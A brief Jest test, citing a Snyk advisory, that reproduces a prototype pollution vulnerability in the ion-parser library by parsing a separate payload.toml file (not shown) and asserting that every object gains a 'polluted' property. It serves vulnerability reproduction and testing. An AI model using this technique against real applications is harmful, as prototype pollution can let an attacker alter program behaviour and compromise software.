//https://snyk.io/vuln/SNYK-JS-IONPARSER-1048971
test("prototype pollution in ion-parser", () => {
  const fs = require("fs");
  const path = require("path");
  const ION = require("ion-parser");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  ION.parse(
    fs.readFileSync(path.resolve(__dirname, "./payload.toml"), "utf-8")
  );
  expect({}.polluted).toBe("yes");
});
